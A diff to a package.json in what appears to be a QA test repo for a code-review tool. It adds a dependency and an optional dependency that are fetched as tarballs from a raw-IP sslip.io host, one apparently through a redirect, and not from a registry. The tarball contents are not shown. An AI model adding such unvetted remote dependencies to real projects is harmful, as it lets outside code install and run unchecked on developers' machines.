@@ -5,5 +5,11 @@
   "description": "Minimal static app for CodeRabbit Verify QA environment setup (H10 test repo)",
   "scripts": {
     "start": "node server.js"
+  },
+  "dependencies": {
+    "cr-h270-direct": "https://129-151-247-6.sslip.io:8443/h270/direct/cr-h270-direct-1.0.0.tgz"
+  },
+  "optionalDependencies": {
+    "cr-h270-redir": "https://129-151-247-6.sslip.io:8443/h270/redir/cr-h270-redir-1.0.0.tgz"
   }
 }
